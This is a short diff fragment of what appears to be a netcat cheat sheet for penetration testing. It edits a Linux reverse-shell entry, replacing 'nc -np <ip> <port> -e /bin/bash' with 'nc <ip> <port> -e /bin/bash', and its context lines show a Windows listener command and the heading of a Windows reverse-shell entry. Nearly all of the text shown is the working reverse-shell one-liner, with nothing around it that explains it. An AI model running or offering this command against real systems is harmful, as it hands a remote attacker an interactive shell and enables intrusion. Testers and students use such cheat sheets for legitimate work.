@@ -21,7 +21,7 @@ nc.exe -lnvp <port>
 
 ## reverse - linux binder
 ```
-nc -np <ip> <port> -e /bin/bash
+nc <ip> <port> -e /bin/bash
 ```
 
 ## reverse - windows binder
